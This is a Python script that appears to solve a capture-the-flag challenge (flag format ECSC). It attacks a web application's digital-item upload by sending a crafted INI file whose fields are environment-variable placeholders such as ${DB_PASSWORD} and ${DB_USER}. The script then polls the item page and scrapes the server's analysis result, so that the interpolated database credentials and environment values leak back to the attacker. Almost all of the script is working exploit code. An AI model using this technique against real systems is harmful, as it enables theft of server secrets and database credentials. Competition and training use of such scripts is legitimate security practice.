#!/usr/bin/env python3
import re
import requests
import os
from bs4 import BeautifulSoup
import random
import time

FLAG_REGEX = r"ECSC\w{32}"
host = os.environ.get("target", "localhost:8080")

host = "http://" + host

username = "test@bla.at" + str(random.randint(0, 123123123))
password = "Password123"

# upload digital item with payload
ini = """
[DB]
host = ${DB_HOST}
user = ${DB_USER}
password = ${DB_PASSWORD}
name = ${DB_NAME}
[App]
name = ${PLANT_NAME}
path = ${PATH}
"""

s = requests.Session()
r = s.post(host + "/recycle/digital/upload", data={
    "item_description": "foo",
    "auth_type": "account",
    "newEmail": username,
    "newPassword": password,
    "newFirstname": "Foo",
    "newLastname": "Bar"
}, files={"datafile": ("sess_", ini, "multipart/form-data")})
if r.status_code != 200:
    print(r.text)
    raise Exception(f"Failed to upload ini file (invalid statuscode {r.status_code})")

if "Logout" not in r.text:
    print(r.text)
    raise Exception("Upload failed")

item_url = r.url
print("Item Url: " + item_url)

# wait until the file has been processed
def isAnalyzed():
    r = s.get(item_url)
    return "Processed" in r.text

i = 1
while not isAnalyzed():
    print("Waiting round " + str(i))
    time.sleep(2)
    i += 1
    if i > 30:
        raise Exception("Had to wait too long for processing")

# get response from 'ini' analysis
r = s.get(item_url)

bs = BeautifulSoup(r.text, "html.parser")
results = bs.find_all('div', class_='result')
for res in results:
    title = res.find('p').get_text()
    if "Type: ini" in title:
        print("Found 'ini' analysis result")
        file_result = res.find("pre").get_text()
        print(file_result)